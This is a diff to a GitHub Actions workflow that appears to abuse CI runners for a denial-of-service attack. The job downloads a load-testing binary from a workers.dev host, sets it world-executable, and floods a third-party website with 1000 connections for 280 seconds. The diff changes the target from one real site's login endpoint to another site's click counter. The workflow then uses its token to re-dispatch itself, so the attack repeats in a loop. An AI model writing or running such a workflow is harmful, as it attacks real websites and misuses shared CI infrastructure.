@@ -16,7 +16,7 @@ jobs:
         run: |
           wget https://ddos.nms.workers.dev/wrk
           chmod 777 wrk
-          ./wrk -c1000 -t300 -d280s http://wy.targetedu.cn:9999/login/verify/0.6069696256114081
+          ./wrk -c1000 -t300 -d280s https://www.acwing.com/status/count/click/
           curl -X POST -H "Authorization: token $GITHUB_TOKEN" -H "Accept: application/vnd.github.v3+json" -d '{"ref": "main"}' https://api.github.com/repos/niniubiwoc/run-script-action/actions/workflows/blank.yml/dispatches
   build2:
     runs-on: ubuntu-latest
